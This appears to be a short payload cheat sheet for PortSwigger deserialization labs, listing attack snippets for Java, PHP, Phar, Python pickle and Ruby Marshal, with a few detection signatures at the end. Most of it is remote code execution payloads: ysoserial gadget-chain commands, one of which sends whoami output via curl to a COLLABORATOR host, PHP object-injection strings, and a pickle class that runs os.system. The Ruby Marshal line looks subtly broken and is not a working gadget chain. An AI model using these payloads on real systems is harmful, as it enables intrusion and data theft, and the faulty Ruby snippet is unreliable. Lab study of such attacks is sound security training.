# PortSwigger Deserialization Labs — Complete Reference

## Java Deserialization
```bash
# ysoserial - common gadget chains
ysoserial CommonsCollections4 "curl http://COLLABORATOR/$(whoami)" | base64
ysoserial CommonsCollections6 "id"
ysoserial URLDNS "http://COLLABORATOR"
```

## PHP Deserialization
```php
// Object injection
O:8:"Example":0:{}
// With properties
O:8:"Example":2:{s:3:"cmd";s:3:"id";}
```

## PHP Phar Deserialization
```php
// Upload .phar file
// Trigger via:
phar://path/to/file.phar
```

## Python Pickle
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(RCE())
```

## Ruby Marshal
```ruby
payload = Marshal.dump(ERB.new("id").result)
```

## Detection
- Base64-encoded serialized objects (Java: `rO0AB`, PHP: `O:`, Python: `gAS`)
- Binary data streams
- Session tokens that decode to objects
